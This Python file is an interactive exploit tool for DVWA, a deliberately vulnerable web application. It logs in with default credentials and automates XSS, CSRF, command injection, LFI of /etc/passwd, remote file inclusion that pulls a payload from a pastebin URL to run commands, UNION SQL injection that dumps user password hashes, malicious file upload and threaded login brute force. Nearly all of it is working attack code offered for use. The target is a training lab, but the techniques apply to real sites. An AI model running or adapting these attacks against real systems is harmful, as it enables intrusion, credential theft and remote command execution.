import requests, os, platform
from urllib.parse import quote
import string, bs4, prettytable, random
import threading, time
rnd = lambda : random.choice(['/', '\\'])
clear = lambda : 'clear' if 'linux' in platform.platform().lower() else 'cls'
security = ".low  .medium  .High"
close = "[+] for exit program insert '.close' or Control + C"
banner = """██╗████████╗███████╗ █████╗ ███████╗███████╗              ██████╗ ██╗   ██╗██╗    ██╗ █████╗ 
██║╚══██╔══╝██╔════╝██╔══██╗██╔════╝██╔════╝              ██╔══██╗██║   ██║██║    ██║██╔══██╗
██║   ██║   ███████╗███████║█████╗  █████╗      █████╗    ██║  ██║██║   ██║██║ █╗ ██║███████║
██║   ██║   ╚════██║██╔══██║██╔══╝  ██╔══╝      ╚════╝    ██║  ██║╚██╗ ██╔╝██║███╗██║██╔══██║
██║   ██║   ███████║██║  ██║██║     ███████╗              ██████╔╝ ╚████╔╝ ╚███╔███╔╝██║  ██║
╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝              ╚═════╝   ╚═══╝   ╚══╝╚══╝ ╚═╝  ╚═╝
                                                                                             """
class exploit_system(object):
    def __init__(self, security):
        self.security = security
        self.session = requests.Session()
        self.host = input("[+] insert doamin or ip of traget => ")
        self.session.cookies['security'] = self.security.replace('.', '')
        self.session.post(f'http://{self.host}/dvwa/login.php', data={'username':'admin', 'password':'password', 'Login':'Login'})
        self.session.cookies['security'] = self.security.replace('.', '')
        self.restart_login = False

    def xss_r(self):
        os.system(clear())
        print(banner)
        print(f"[+] this XSS Reflected level security : {self.security}")
        javascript = input("[+] paste your javascript here : ")
        if self.security == '.low':
            input(f"[+] payload : http://{self.host}/dvwa/vulnerabilities/xss_r/?name=<script>{quote(javascript)}</script>")
        elif self.security == '.medium':
            input(f"[+] payload : http://{self.host}/dvwa/vulnerabilities/xss_r/?name=<ScRiPt>{quote(javascript)}</ScRiPt>")
    def xss_s(self):
        os.system(clear())
        print(banner)
        print(f"[+] this XSS Storage level security : {self.security}")
        javascript = input("[+] paste your javascript here : ")
        if self.security == '.low':
            self.session.post(f'http://{self.host}/dvwa/vulnerabilities/xss_s/', data={'txtName':f'<script>{javascript}</script>', 'mtxMessage':'ExploitMe', 'btnSign':'Sign+Guestbook'})
        elif self.security == '.medium':
            self.session.post(f'http://{self.host}/dvwa/vulnerabilities/xss_s/', data={'txtName':f'<ScRiPt>{javascript}</ScRiPt>', 'mtxMessage':f'<ScRiPt>{javascript}</ScRiPt>', 'btnSign':'Sign+Guestbook'})
        input(f"[+] GOTO http://{self.host}/dvwa/vulnerabilities/xss_s/")
    def csrf(self):
        os.system(clear())
        print(banner)
        print(f"[+] this CSRF level security : {self.security}")
        if self.security == '.low' or self.security == '.medium':
            new_password = input("[+] Enter New Password : ")
            file_name = "".join([random.choice(list(string.ascii_letters)) for i in range(10)]) + '.html'
            buffer = f"<form action='http://{self.host}/dvwa/vulnerabilities/csrf/' method='GET'>"
            buffer += f"<input hidden name='password_new' value='{new_password}'>"
            buffer += f"<input hidden name='password_conf' value='{new_password}'>"
            buffer += "<button type=submit value=Change name=Change>Get Gift</button>"
            buffer += "</form>"
        open(file_name, "w+").write(buffer)
        input(f'[+] File Payload => {file_name}')
        tasker = input("[+] you want turn on the python server y/n ? ")
        if tasker.lower() == 'y':
            os.system("python3 -m http.server 5000")
        
    def command_execution(self):
        os.system(clear())
        print(banner)
        print(f"[+] this Command Injection level security : {self.security}")
        if self.security == '.low' or self.security == '.medium':
            while True:
                cmd = input("? ")
                if cmd == 'exit':
                    break
                res = self.session.post(f'http://{self.host}/dvwa/vulnerabilities/exec/', data={'ip':f'10.0.0.0.0.0.0 | {cmd} 2>&1', 'submit':'submit'}) # for fix slow leave the ip addres invalid
                sup = bs4.BeautifulSoup(res.text, 'html.parser')
                print(sup.find('pre').text.strip())

    def file_inclusion(self):
        os.system(clear())
        print(banner)
        schema = 'https'
        print(f"[+] this inclusion level security : {self.security}")
        action = input("[1] LFI (Local File Include)\n[2] RFI (Remote File Include)\n")
        if self.security == '.low' or self.security == '.medium':
            if self.security == '.medium':
                schema = 'HttPs'
            if action == '1':
                payload = f"http://{self.host}/dvwa/vulnerabilities/fi/?page=/etc/passwd"
                res = self.session.get(payload).text.splitlines()
                for iteam in res:
                    if 'bin' in iteam:
                        print(iteam)
            else:
                while True:
                    cmd = input("? ")
                    if cmd == "exit":
                        break
                    
                    payload = f"http://{self.host}/dvwa/vulnerabilities/fi/?page={schema}://pastebin.com/raw/temBTdrj&RCE={cmd}"
                    sup = bs4.BeautifulSoup(self.session.get(payload).text, 'html.parser')
                    print(sup.find("span", id="RFI").text.strip())

        input(f'[+] Payload : {payload}')
    def sql_injection(self, ch="sqli"):
        os.system(clear())
        print(banner)
        print(f"[+] this Injection method : {ch}\n[+] level security : {self.security}")
        fix_stage = lambda : "" if self.security == '.medium' else "'"
        SQL_ASKER = [[f"777{fix_stage()} or 1=2 union select 1, group_concat(table_name) from information_schema.tables where table_schema=database()#", ["tables"]], [f"777{fix_stage()} or 1=2 union select 1, group_concat(comment_id,0x7b445657417d,comment,0x7b445657417d,name) from guestbook#", ["comment_id","comment","name"]], [f"777{fix_stage()} or 1=2 union select 1, group_concat(user_id,0x7b445657417d,first_name,0x7b445657417d,last_name,0x7b445657417d,user,0x7b445657417d,password,0x7b445657417d,avatar) from users#", ["user_id","first_name","last_name","user","password","avatar"]]]
        if self.security == '.low' or self.security == '.medium':
            for args in SQL_ASKER:
                tables =  prettytable.PrettyTable()
                SQL, tables.field_names = args
                try:
                    sup = bs4.BeautifulSoup(self.session.get(f'http://{self.host}/dvwa/vulnerabilities/{ch}/?id={quote(SQL)}&Submit=Submit#').text, 'html.parser')
                    text = sup.find('pre').text
                    text = text[text.find("Surname")+9:]
                    for line in text.split(','):
                        tables.add_row(line.split('{DVWA}'))
                    print(tables)
                    print(f"[+] Payload : http://{self.host}/dvwa/vulnerabilities/{ch}/?id={quote(SQL)}&Submit=Submit#")
                except Exception as e:
                    print(e, tables.field_names, line.split('{DVWA}'))
        input("Done Push for back menu")
    def sql_blind_injection(self):
        self.sql_injection(ch="sqli_blind")
    def file_upload(self):
        os.system(clear())
        print(banner)
        file_name = input("[+] Enter File Path to upload => ")
        print(f"[+] this file upload level security : {self.security}")
        if self.security == '.low' or self.security == '.medium':
            ContentType = "multipart/form-data"
            if self.security == '.medium':
                ContentType = "image/jpeg"
            print(f"[+] start upload ... {file_name}")
            d_f = open(file_name, 'rb').read()
            files = {'uploaded':(file_name, d_f, ContentType)}
            data = {'MAX_FILE_SIZE':len(d_f), 'Upload':'Upload'}    
            res = self.session.post(f'http://{self.host}/dvwa/vulnerabilities/upload/', files=files, data=data)
            if 'succesfully uploaded!' in res.text:
                file_short = file_name.split('/')[-1]
                print(f'[+] good work GOTO http://{self.host}/dvwa/vulnerabilities/upload/../../hackable/uploads/{file_short}')
            else:
                print('[-] Somting is crash')

        input("[+] Done")
    def brute_force(self):
        os.system(clear())
        print(banner)
        username = input("[+] Enter UserName account u want been hacked => ")
        wordlist = input("[+] Enter common list => ")
        print(f"[+] this Brute Force level security : {self.security}")
        
        if self.security == '.low' or self.security == '.medium':
            print(f"[+] start exploit ... {username}")
            for password in open(wordlist, 'r').read().splitlines():
                if self.restart_login == True:
                    break
                print(f"[+] trying login {rnd()} {username}:{password} {rnd()}", end="\r")
                threading.Thread(target=self.login, args=(username, password)).start()
                time.sleep(0.1)
        if self.restart_login == False:
            print("[+] Not Found Password In List ... ")
        self.restart_login = False
        input("\n[+] Done")
    def login(self, username, password):
        if self.security == '.low' or self.security == '.medium':
            sup = bs4.BeautifulSoup(self.session.get(f'http://{self.host}/dvwa/vulnerabilities/brute/', params=f"username={username}&password={password}&Login=Login").text, 'html.parser')
            res = sup.find('pre')
            if res is None:
                self.restart_login = True
                print(f"[+] login seccuss {rnd()} {username}:{password} {rnd()}", end="\r")
while True:
    os.system(clear())
    print(banner)
    print(security)
    print(close)
    tasker = input("select the mode security => ")
    if tasker == ".close":
        break
    elif tasker == '.low' or tasker == '.medium' or tasker == '.High':
        use = exploit_system(tasker)
        exploits_list = [
            {'id':'1', 'name':'Reflected Cross Site Scripting (XSS)', 'exploit':use.xss_r},
            {'id':'2', 'name':'Stored Cross Site Scripting (XSS)', 'exploit':use.xss_s},
            {'id':'3', 'name':'Cross Site Request Forgery (CSRF)', 'exploit':use.csrf},
            {'id':'4', 'name':'Command Execution', 'exploit':use.command_execution},
            {'id':'5', 'name':'File Inclusion', 'exploit':use.file_inclusion},
            {'id':'6', 'name':'SQL Injection', 'exploit':use.sql_injection},
            {'id':'7', 'name':'SQL Injection (Blind)', 'exploit':use.sql_blind_injection},
            {'id':'8', 'name':'File Upload', 'exploit':use.file_upload},
            {'id':'9', 'name':'Brute Force', 'exploit':use.brute_force}
            ]
        while True:
            os.system(clear())
            print(banner)
            for iteam in exploits_list:
                print(f"[{iteam['id']}] => {iteam['name']}")
            
            print(close)
            print(f"[+] level security for change Enter .close: {use.security}")
            tasker = input("select id exploit from list are you want to use => ")
            if tasker == '.close':
                break
            try:
                exploit_this = exploits_list[int(tasker)-1]
                exploit_this['exploit']()
            except:
                continue
